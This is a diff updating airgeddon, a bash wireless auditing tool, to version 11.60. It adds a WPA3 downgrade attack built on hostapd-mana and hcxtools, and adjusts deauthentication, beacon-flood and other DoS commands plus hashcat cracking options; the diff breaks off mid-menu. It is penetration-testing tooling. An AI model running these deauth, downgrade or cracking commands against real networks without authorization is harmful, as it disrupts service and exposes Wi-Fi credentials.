@@ -2,7 +2,7 @@
 #Title........: airgeddon.sh
 #Description..: This is a multi-use bash script for Linux systems to audit wireless networks.
 #Author.......: v1s1t0r
-#Version......: 11.52
+#Version......: 11.60
 #Usage........: bash airgeddon.sh
 #Bash Version.: 4.2 or later
 
@@ -74,6 +74,9 @@ optional_tools_names=(
 						"tshark"
 						"tcpdump"
 						"besside-ng"
+						"hostapd-mana"
+						"hcxhash2cap"
+						"hcxhashtool"
 					)
 
 update_tools=("curl")
@@ -116,6 +119,9 @@ declare -A possible_package_names=(
 									[${optional_tools_names[25]}]="tshark / wireshark-cli / wireshark" #tshark
 									[${optional_tools_names[26]}]="tcpdump" #tcpdump
 									[${optional_tools_names[27]}]="aircrack-ng" #besside-ng
+									[${optional_tools_names[28]}]="hostapd-mana" #hostapd-mana
+									[${optional_tools_names[29]}]="hcxtools" #hcxhash2cap
+									[${optional_tools_names[30]}]="hcxtools" #hcxhashtool
 									[${update_tools[0]}]="curl" #curl
 								)
 
@@ -125,8 +131,8 @@ declare -A possible_alias_names=(
 								)
 
 #General vars
-airgeddon_version="11.52"
-language_strings_expected_version="11.52-1"
+airgeddon_version="11.60"
+language_strings_expected_version="11.60-1"
 standardhandshake_filename="handshake-01.cap"
 standardpmkid_filename="pmkid_hash.txt"
 standardpmkidcap_filename="pmkid.cap"
@@ -134,6 +140,7 @@ timeout_capture_handshake_decloak="20"
 timeout_capture_pmkid="45"
 timeout_capture_identities="45"
 timeout_certificates_analysis="45"
+timeout_wpa3_downgrade="25"
 osversionfile_dir="/etc/"
 plugins_dir="plugins/"
 ag_orchestrator_file="ag.orchestrator.txt"
@@ -241,7 +248,7 @@ author="v1s1t0r"
 wpa3_online_attack_plugin_repo="https://${repository_hostname}/OscarAkaElvis/airgeddon-plugins"
 wpa3_dragon_drain_plugin_repo="https://${repository_hostname}/Janek79ax/dragon-drain-wpa3-airgeddon-plugin"
 
-#Dhcpd, Hostapd and misc Evil Twin vars
+#Dhcpd, Hostapd, Hostapd-wpe, Hostapd-mana and misc Evil Twin vars
 loopback_ip="127.0.0.1"
 loopback_ipv6="::1/128"
 loopback_interface="lo"
@@ -281,6 +288,9 @@ hostapd_wpe_wifi7_version="2.12"
 hostapd_wpe_file="ag.hostapd_wpe.conf"
 hostapd_wpe_log="ag.hostapd_wpe.log"
 hostapd_wpe_default_log="hostapd-wpe.log"
+hostapd_mana_file="ag.hostapd_mana.conf"
+hostapd_mana_log="ag.hostapd_mana.log"
+hostapd_mana_out="ag.hostapd_mana.hccapx"
 control_et_file="ag.et_control.sh"
 control_enterprise_file="ag.enterprise_control.sh"
 enterprisedir="enterprise/"
@@ -288,6 +298,9 @@ certsdir="certs/"
 certspass="airgeddon"
 default_certs_path="/etc/hostapd-wpe/certs/"
 default_certs_pass="whatever"
+mana_pass="airgeddon"
+mana_cap_file="ag.mana.cap"
+mana_tmp_file="ag.mana.txt"
 webserver_file="ag.lighttpd.conf"
 webserver_log="ag.lighttpd.log"
 webdir="www/"
@@ -303,6 +316,7 @@ enterprise_successfile="ag.enterprise_success.txt"
 et_processesfile="ag.et_processes.txt"
 asleap_pot_tmp="ag.asleap_tmp.txt"
 channelfile="ag.et_channel.txt"
+customportals_php_as_cgi=1
 possible_dhcp_leases_files=(
 								"/var/lib/dhcp/dhcpd.leases"
 								"/var/state/dhcp/dhcpd.leases"
@@ -367,6 +381,7 @@ sponsors=(
 		"Kaliscandinavia"
 		"Furrycoder"
 		"Jonathon Coy"
+		"Matthew Ebert"
 		)
 
 #Hint vars
@@ -383,6 +398,7 @@ declare language_hints=(250 438)
 declare option_hints=(445 250 448 477 591 626 697 699)
 declare evil_twin_hints=(254 258 264 269 309 328 400 509 697 699 739)
 declare evil_twin_dos_hints=(267 268 509 697 699)
+declare wpa3_dos_hints=(267 268 697 699 777)
 declare beef_hints=(408)
 declare wps_hints=(342 343 344 356 369 390 490 625 697 699 739)
 declare wep_hints=(431 429 428 432 433 697 699 739)
@@ -1558,7 +1574,22 @@ function region_check() {
 	[[ ! ${country_code} =~ ^[A-Z]{2}$|^99$ ]] && country_code="00"
 }
 
-#Prepare monitor mode avoiding the use of airmon-ng or airmon-zc generating two interfaces from one
+#Prepare monitor mode avoiding the use of airmon-ng or airmon-zc generating two interfaces from one for WPA3 downgrade attack
+function prepare_wpa3_downgrade_monitor() {
+
+	debug_print
+
+	disable_rfkill
+
+	iface_phy_number=${phy_interface:3:1}
+	iface_monitor_downgrade_deauth="mon${iface_phy_number}"
+
+	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
+	iw phy "${phy_interface}" interface add "${iface_monitor_downgrade_deauth}" type monitor 2> /dev/null
+	ip link set "${iface_monitor_downgrade_deauth}" up > /dev/null 2>&1
+}
+
+#Prepare monitor mode avoiding the use of airmon-ng or airmon-zc generating two interfaces from one for Evil Twin attacks
 function prepare_et_monitor() {
 
 	debug_print
@@ -1568,9 +1599,9 @@ function prepare_et_monitor() {
 	iface_phy_number=${phy_interface:3:1}
 	iface_monitor_et_deauth="mon${iface_phy_number}"
 
+	iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 	iw phy "${phy_interface}" interface add "${iface_monitor_et_deauth}" type monitor 2> /dev/null
 	ip link set "${iface_monitor_et_deauth}" up > /dev/null 2>&1
-	iw "${iface_monitor_et_deauth}" set channel "${channel}" > /dev/null 2>&1
 }
 
 #Assure the mode of the interface before the Evil Twin or Enterprise process
@@ -1660,6 +1691,90 @@ function restore_et_interface() {
 	fi
 
 	control_routing_status "end"
+}
+
+#Assure the mode of the interface before the WPA3 downgrade attack process
+function prepare_wpa3_downgrade_interface() {
+
+	debug_print
+
+	downgrade_initial_state=${ifacemode}
+
+	if [ "${ifacemode}" != "Managed" ]; then
+		check_airmon_compatibility "interface"
+		if [ "${interface_airmon_compatible}" -eq 1 ]; then
+
+			new_interface=$(${airmon} stop "${interface}" 2> /dev/null | grep station | head -n 1)
+			ifacemode="Managed"
+			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+
+			if [ "${interface}" != "${new_interface}" ]; then
+				if check_interface_coherence; then
+					interface=${new_interface}
+					phy_interface=$(physical_interface_finder "${interface}")
+					check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
+					current_iface_on_messages="${interface}"
+				fi
+				echo
+				language_strings "${language}" 15 "yellow"
+			fi
+		else
+			if ! set_mode_without_airmon "${interface}" "managed"; then
+				echo
+				language_strings "${language}" 1 "red"
+				language_strings "${language}" 115 "read"
+				return 1
+			else
+				ifacemode="Managed"
+			fi
+		fi
+	fi
+}
+
+#Restore the state of the interfaces after WAP3 downgrade attack process
+function restore_wpa3_downgrade_interface() {
+
+	debug_print
+
+	echo
+	language_strings "${language}" 299 "blue"
+
+	disable_rfkill
+
+	mac_spoofing_desired=0
+
+	iw dev "${iface_monitor_downgrade_deauth}" del > /dev/null 2>&1
+
+	if [ "${downgrade_initial_state}" = "Managed" ]; then
+		set_mode_without_airmon "${interface}" "managed"
+		ifacemode="Managed"
+	else
+		if [ "${interface_airmon_compatible}" -eq 1 ]; then
+			new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
+			desired_interface_name=""
+			[[ ${new_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"
+			if [ -n "${desired_interface_name}" ]; then
+				echo
+				language_strings "${language}" 435 "red"
+				language_strings "${language}" 115 "read"
+				return
+			fi
+
+			ifacemode="Monitor"
+
+			[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
+			if [ "${interface}" != "${new_interface}" ]; then
+				interface=${new_interface}
+				phy_interface=$(physical_interface_finder "${interface}")
+				check_interface_supported_bands "${phy_interface}" "main_wifi_interface"
+				current_iface_on_messages="${interface}"
+			fi
+		else
+			if set_mode_without_airmon "${interface}" "monitor"; then
+				ifacemode="Monitor"
+			fi
+		fi
+	fi
 }
 
 #Unblock if possible the interface if blocked
@@ -1920,6 +2035,7 @@ function hookable_wpa3_attacks_menu() {
 	language_strings "${language}" 56
 	language_strings "${language}" 49
 	language_strings "${language}" 50 "separator"
+	language_strings "${language}" 774 wpa3_downgrade_attack_dependencies[@]
 	language_strings "${language}" 756 "${plugin_x_under_construction}"
 	language_strings "${language}" 757 "${plugin_y_under_construction}"
 	print_hint
@@ -1942,9 +2058,40 @@ function hookable_wpa3_attacks_menu() {
 			explore_for_targets_option "WPA3"
 		;;
 		5)
-			"${plugin_x}"
+			if contains_element "${wpa3_option}" "${forbidden_options[@]}"; then
+				forbidden_menu_option
+			else
+				current_iface_on_messages="${interface}"
+				if check_interface_wifi "${interface}"; then
+					if [ "${adapter_vif_support}" -eq 0 ]; then
+						ask_yesno 696 "no"
+						if [ "${yesno}" = "y" ]; then
+							downgrade_attack_adapter_prerequisites_ok=1
+						fi
+					else
+						downgrade_attack_adapter_prerequisites_ok=1
+					fi
+
+					if [ "${downgrade_attack_adapter_prerequisites_ok}" -eq 1 ]; then
+						if explore_for_targets_option "WPA3"; then
+							if validate_wpa3_network "only_mixed" "${tmpdir}nws-01.cap"; then
+								if validate_network_type "personal"; then
+									wpa3_dos_menu
+								fi
+							fi
+						fi
+					fi
+				else
+					echo
+					language_strings "${language}" 281 "red"
+					language_strings "${language}" 115 "read"
+				fi
+			fi
 		;;
 		6)
+			"${plugin_x}"
+		;;
+		7)
 			"${plugin_y}"
 		;;
 		*)
@@ -3114,8 +3261,19 @@ function ask_bssid() {
 			fi
 		fi
 
-		while [[ ! ${wps_bssid} =~ ${regexp} ]]; do
-			read_bssid "wps"
+		while true; do
+			while [[ ! ${wps_bssid} =~ ${regexp} ]]; do
+				read_bssid "wps"
+			done
+			local first_byte_hex="${wps_bssid%%:*}"
+			local first_byte=$((16#$first_byte_hex))
+			if (( first_byte & 1 )); then
+				echo
+				language_strings "${language}" 773 "red"
+				read_bssid "wps"
+				continue
+			fi
+			break
 		done
 		echo
 		language_strings "${language}" 364 "blue"
@@ -3136,8 +3294,19 @@ function ask_bssid() {
 			fi
 		fi
 
-		while [[ ! ${bssid} =~ ${regexp} ]]; do
-			read_bssid
+		while true; do
+			while [[ ! ${bssid} =~ ${regexp} ]]; do
+				read_bssid
+			done
+			local first_byte_hex="${bssid%%:*}"
+			local first_byte=$((16#$first_byte_hex))
+			if (( first_byte & 1 )); then
+				echo
+				language_strings "${language}" 773 "red"
+				read_bssid
+				continue
+			fi
+			break
 		done
 		echo
 		language_strings "${language}" 28 "blue"
@@ -3267,6 +3436,10 @@ function read_timeout() {
 			min_max_timeout="10-100"
 			timeout_shown="${timeout_certificates_analysis}"
 		;;
+		"wpa3_downgrade")
+			min_max_timeout="10-100"
+			timeout_shown="${timeout_wpa3_downgrade}"
+		;;
 	esac
 
 	language_strings "${language}" 393 "green"
@@ -3297,6 +3470,9 @@ function ask_timeout() {
 		"certificates_analysis")
 			local regexp="^[1-9][0-9]$|^100$|^$"
 		;;
+		"wpa3_downgrade")
+			local regexp="^[1-9][0-9]$|^100$|^$"
+		;;
 	esac
 
 	timeout=0
@@ -3324,6 +3500,9 @@ function ask_timeout() {
 			"certificates_analysis")
 				timeout="${timeout_certificates_analysis}"
 			;;
+			"wpa3_downgrade")
+				timeout="${timeout_wpa3_downgrade}"
+			;;
 		esac
 	fi
 
@@ -3346,6 +3525,9 @@ function ask_timeout() {
 		;;
 		"certificates_analysis")
 			timeout_certificates_analysis="${timeout}"
+		;;
+		"wpa3_downgrade")
+			timeout_wpa3_downgrade="${timeout}"
 		;;
 	esac
 
@@ -3845,16 +4027,38 @@ function validate_network_type() {
 	return 0
 }
 
-#Validate a WPA3 network
+#Validate a WPA3 network (any type or only in mixed mode)
 function validate_wpa3_network() {
 
 	debug_print
 
+	local type
+
+	if [ -z "${1}" ]; then
+		type="wpa3_pure_and_wpa3_mixed"
+	else
+		type="${1}"
+	fi
+
 	if [ "${enc}" != "WPA3" ]; then
 		echo
-		language_strings "${language}" 759 "red"
+		if [ "${type}" = "wpa3_pure_and_wpa3_mixed"  ]; then
+			language_strings "${language}" 759 "red"
+		elif [ "${type}" = "only_mixed"  ]; then
+			language_strings "${language}" 780 "red"
+		fi
+
 		language_strings "${language}" 115 "read"
 		return 1
+	else
+		if [ "${type}" = "only_mixed"  ]; then
+			if ! tshark -r "${2}" -Y "wlan.rsn.akms.type == 2 && wlan.rsn.akms.type == 8 && wlan.sa == ${bssid}" -T fields -e wlan.sa 2> /dev/null | grep -q .; then
+				echo
+				language_strings "${language}" 781 "red"
+				language_strings "${language}" 115 "read"
+				return 1
+			fi
+		fi
 	fi
 
 	return 0
@@ -4262,7 +4466,7 @@ function set_wep_script() {
 			fi
 		}
 
-		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		mkdir "${tmpdir}${wepdir}" > /dev/null 2>&1
 		#shellcheck disable=SC2164
 		pushd "${tmpdir}${wepdir}" > /dev/null 2>&1
@@ -4701,6 +4905,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}bl.txt -c ${channel}"
@@ -4709,10 +4914,10 @@ function launch_dos_pursuit_mode_attack() {
 			fi
 		;;
 		"aireplay deauth attack")
-			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
 			dos_delay=3
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}"
@@ -4724,6 +4929,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
@@ -4735,6 +4941,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} b -n '${essid}' -c ${channel} -s 1000 -h" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} b -n ${essid} -c ${channel} -s 1000 -h"
@@ -4746,6 +4953,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} w -e '${essid}' -c ${channel}" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} w -e ${essid} -c ${channel}"
@@ -4757,6 +4965,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${interface}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${g1_topleft_window} -T \"${1} (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024" "${1} (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} m -t ${bssid} -w 1 -n 1024 -s 1024"
@@ -4768,6 +4977,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=1
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}" "Deauth (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} d -b ${tmpdir}\"bl.txt\" -c ${channel}"
@@ -4778,7 +4988,7 @@ function launch_dos_pursuit_mode_attack() {
 		"Aireplay")
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
-			iw "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			dos_delay=3
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "aireplay-ng --deauth 0 -a ${bssid} --ignore-negative-one ${interface_pursuit_mode_deauth}" "Deauth (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
@@ -4791,6 +5001,7 @@ function launch_dos_pursuit_mode_attack() {
 			dos_delay=10
 			interface_pursuit_mode_scan="${secondary_wifi_interface}"
 			interface_pursuit_mode_deauth="${iface_monitor_et_deauth}"
+			iw dev "${interface_pursuit_mode_deauth}" set channel "${channel}" > /dev/null 2>&1
 			manage_output "+j -bg \"#000000\" -fg \"#FF0000\" -geometry ${deauth_scr_window_position} -T \"Deauth (DoS Pursuit mode)\"" "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m" "Deauth (DoS Pursuit mode)"
 			if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "tmux" ]; then
 				get_tmux_process_id "${mdk_command} ${interface_pursuit_mode_deauth} a -a ${bssid} -m"
@@ -4928,6 +5139,7 @@ function exec_mdkdeauth() {
 		launch_dos_pursuit_mode_attack "${mdk_command} amok attack" "first_time"
 		pid_control_pursuit_mode "${mdk_command} amok attack"
 	else
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -4956,8 +5168,7 @@ function exec_aireplaydeauth() {
 		launch_dos_pursuit_mode_attack "aireplay deauth attack" "first_time"
 		pid_control_pursuit_mode "aireplay deauth attack"
 	else
-		${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
-
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -4986,6 +5197,7 @@ function exec_wdsconfusion() {
 		launch_dos_pursuit_mode_attack "wids / wips / wds confusion attack" "first_time"
 		pid_control_pursuit_mode "wids / wips / wds confusion attack"
 	else
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -5014,6 +5226,7 @@ function exec_beaconflood() {
 		launch_dos_pursuit_mode_attack "beacon flood attack" "first_time"
 		pid_control_pursuit_mode "beacon flood attack"
 	else
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -5042,6 +5255,7 @@ function exec_authdos() {
 		launch_dos_pursuit_mode_attack "auth dos attack" "first_time"
 		pid_control_pursuit_mode "auth dos attack"
 	else
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -5070,6 +5284,7 @@ function exec_michaelshutdown() {
 		launch_dos_pursuit_mode_attack "michael shutdown attack" "first_time"
 		pid_control_pursuit_mode "michael shutdown attack"
 	else
+		iw dev "${interface}" set channel "${channel}" > /dev/null 2>&1
 		language_strings "${language}" 33 "yellow"
 		language_strings "${language}" 4 "read"
 		recalculate_windows_sizes
@@ -5948,6 +6163,12 @@ function print_decrypt_vars() {
 	if [ -n "${RULES}" ]; then
 		language_strings "${language}" 243 "blue"
 	fi
+
+	if [ -n "${hashcathashfileenteredpath}" ]; then
+		language_strings "${language}" 794 "blue"
+	else
+		language_strings "${language}" 793 "blue"
+	fi
 }
 
 #Print selected target parameters on personal decrypt menu (bssid, Handshake file, dictionary file and rules file)
@@ -5973,6 +6194,12 @@ function print_personal_decrypt_vars() {
 
 	if [ -n "${RULES}" ]; then
 		language_strings "${language}" 243 "blue"
+	fi
+
+	if [ -n "${hashcathashfileenteredpath}" ]; then
+		language_strings "${language}" 794 "blue"
+	else
+		language_strings "${language}" 793 "blue"
 	fi
 }
 
@@ -6029,6 +6256,7 @@ function initialize_menu_options_dependencies() {
 	aireplay_attack_dependencies=("${optional_tools_names[2]}")
 	mdk_attack_dependencies=("${optional_tools_names[3]}")
 	hashcat_attacks_dependencies=("${optional_tools_names[4]}")
+	hashcat_hash_attacks_dependencies=("${optional_tools_names[4]}" "${optional_tools_names[30]}")
 	et_onlyap_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}")
 	et_sniffing_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[8]}" "${optional_tools_names[9]}")
 	et_sniffing_sslstrip2_dependencies=("${optional_tools_names[5]}" "${optional_tools_names[6]}" "${optional_tools_names[7]}" "${optional_tools_names[16]}")
@@ -6049,6 +6277,7 @@ function initialize_menu_options_dependencies() {
 	johncrunch_attacks_dependencies=("${optional_tools_names[21]}" "${optional_tools_names[1]}")
 	enterprise_certificates_dependencies=("${optional_tools_names[22]}")
 	pmkid_dependencies=("${optional_tools_names[23]}" "${optional_tools_names[24]}")
+	wpa3_downgrade_attack_dependencies=("${optional_tools_names[23]}" "${optional_tools_names[28]}" "${optional_tools_names[29]}" "${optional_tools_names[25]}")
 }
 
 #Set possible changes for some commands that can be found in different ways depending on the O.S.
@@ -6192,6 +6421,10 @@ function initialize_menu_and_print_selections() {
 				print_iface_internet_selected
 			fi
 		;;
+		"wpa3_dos_menu")
+			print_iface_selected
+			print_all_target_vars
+		;;
 		"wps_attacks_menu")
 			print_iface_selected
 			print_all_target_vars_wps
@@ -6213,6 +6446,8 @@ function initialize_menu_and_print_selections() {
 			print_options
 		;;
 		"wpa3_attacks_menu")
+			downgrade_attack_adapter_prerequisites_ok=0
+			return_to_wpa3_main_menu=0
 			print_iface_selected
 			print_all_target_vars
 			if [[ " ${plugins_enabled[*]} " == *" wpa3_online_attack "* ]]; then
@@ -6305,6 +6540,16 @@ function clean_tmpfiles() {
 
 	if [ "${1}" = "exit_script" ]; then
 		rm -rf "${tmpdir}" > /dev/null 2>&1
+		rm -rf "${scriptfolder}${hostapd_wpe_default_log}" > /dev/null 2>&1
+
+		if [ "${dhcpd_path_changed}" -eq 1 ]; then
+			rm -rf "${dhcp_path}" > /dev/null 2>&1
+		fi
+
+		if [ "${beef_found}" -eq 1 ]; then
+			rm -rf "${beef_path}${beef_file}" > /dev/null 2>&1
+		fi
+
 		if is_last_airgeddon_instance; then
 			delete_instance_orchestrator_file
 		fi
@@ -6322,6 +6567,11 @@ function clean_tmpfiles() {
 		rm -rf "${tmpdir}jtrtmp"* > /dev/null 2>&1
 		rm -rf "${tmpdir}${aircrack_pot_tmp}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${et_processesfile}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${hostapd_mana_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${hostapd_mana_out}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${hostapd_mana_log}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${mana_cap_file}" > /dev/null 2>&1
+		rm -rf "${tmpdir}${mana_tmp_file}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${hostapd_file}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${hostapd_wpe_file}" > /dev/null 2>&1
 		rm -rf "${tmpdir}${hostapd_wpe_log}" > /dev/null 2>&1
@@ -6607,6 +6857,13 @@ function print_hint() {
 			((hintlength--))
 			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
 			strtoprint=${hints[evil_twin_hints|${randomhint}]}
+		;;
+		"wpa3_dos_menu")
+			store_array hints wpa3_dos_hints "${wpa3_dos_hints[@]}"
+			hintlength=${#wpa3_dos_hints[@]}
+			((hintlength--))
+			randomhint=$(shuf -i 0-"${hintlength}" -n 1)
+			strtoprint=${hints[wpa3_dos_hints|${randomhint}]}
 		;;
 		"et_dos_menu")
 			store_array hints evil_twin_dos_hints "${evil_twin_dos_hints[@]}"
@@ -7894,9 +8151,9 @@ function personal_decrypt_menu() {
 	language_strings "${language}" 230 hashcat_attacks_dependencies[@]
 	language_strings "${language}" 231 hashcat_attacks_dependencies[@]
 	language_strings "${language}" 232 hashcat_attacks_dependencies[@]
-	language_strings "${language}" 668 hashcat_attacks_dependencies[@]
-	language_strings "${language}" 669 hashcat_attacks_dependencies[@]
-	language_strings "${language}" 670 hashcat_attacks_dependencies[@]
+	language_strings "${language}" 789 hashcat_hash_attacks_dependencies[@]
+	language_strings "${language}" 790 hashcat_hash_attacks_dependencies[@]
+	language_strings "${language}" 791 hashcat_hash_attacks_dependencies[@]
 	print_hint
 
 	read -rp "> " personal_decrypt_option
@@ -7908,14 +8165,14 @@ function personal_decrypt_menu() {
 			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				aircrack_dictionary_attack_option
+				aircrack_dictionary_attack_option "personal_handshake_pmkid_capture"
 			fi
 		;;
 		2)
 			if contains_element "${personal_decrypt_option}" "${forbidden_options[@]}"; then
 				forbidden_menu_option
 			else
-				aircrack_bruteforce_attack_option
+				aircrack_bruteforce_attack_option "personal_handshake_pmkid_capture"
 			fi
 		;;
 		3)
@@ -7924,7 +8181,7 @@ function personal_decrypt_menu() {
 			else
 				get_hashcat_version
 				set_hashcat_parameters
-				hashcat_dictionary_attack_option "personal_handshake"
+				hashcat_dictionary_attack_option "personal_handshake_pmkid_capture"
 			fi
 		;;
 		4)
@@ -7933,7 +8190,7 @@ function personal_decrypt_menu() {
 			else
 				get_hashcat_version
 				set_hashcat_parameters
-				hashcat_bruteforce_attack_option "personal_handshake"
+				hashcat_bruteforce_attack_option "personal_handshake_pmkid_capture"
 			fi
 		;;
 		5)
@@ -7942,7 +8199,7 @@ function personal_decrypt_menu() {
 			else
 				get_hashcat_version
 				set_hashcat_parameters
-				hashcat_rulebased_attack_option "personal_handshake"
+				hashcat_rulebased_attack_option "personal_handshake_pmkid_capture"
 			fi
 		;;
 		6)
@@ -7950,17 +8207,8 @@ function personal_decrypt_menu() {
 				forbidden_menu_option
 			else
 				get_hashcat_version
-				if validate_hashcat_pmkid_version; then
-					echo
-					language_strings "${language}" 678 "yellow"
-					language_strings "${language}" 115 "read"
-					set_hashcat_parameters
-					hashcat_dictionary_attack_option "personal_pmkid"
-				else
-					echo
-					language_strings "${language}" 679 "red"
-					language_strings "${language}" 115 "read"
-				fi
+				set_hashcat_parameters
+				hashcat_dictionary_attack_option "personal_handshake_pmkid_hash"
 			fi
 		;;
 		7)
@@ -7968,17 +8216,8 @@ function personal_decrypt_menu() {
 				forbidden_menu_option
 			else
 				get_hashcat_version
-				if validate_hashcat_pmkid_version; then
-					echo
-					language_strings "${language}" 678 "yellow"
